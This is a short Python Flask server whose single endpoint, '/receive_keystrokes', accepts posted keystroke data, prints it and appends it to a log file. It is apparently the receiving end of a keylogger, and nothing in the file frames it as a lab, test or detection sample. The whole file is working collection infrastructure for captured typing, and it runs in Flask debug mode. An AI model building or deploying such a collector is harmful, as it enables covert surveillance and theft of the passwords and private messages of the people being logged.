from flask import Flask, request

app = Flask(__name__)

# Define the endpoint for receiving keystroke data
@app.route('/receive_keystrokes', methods=['POST'])
def receive_keystrokes():
    # Check if the incoming request is a POST method
    if request.method == 'POST':
        # Extract keystroke data from the request body
        keystroke_data = request.data.decode('utf-8')
        
        # Print the received data to the server console
        print(keystroke_data)
        
        # Optionally, save the data to a file for logging purposes
        with open("received_keystrokes.log", "a") as log_file:
            log_file.write(keystroke_data)
            log_file.write("\n")  # Add a newline for better readability
        
        # Send a success response back to the client
        return 'Data received successfully.', 200
    else:
        # Handle non-POST requests with a 405 Method Not Allowed response
        return 'Only POST requests are accepted.', 405

if __name__ == '__main__':
    # Run the Flask application in debug mode
    app.run(debug=True)
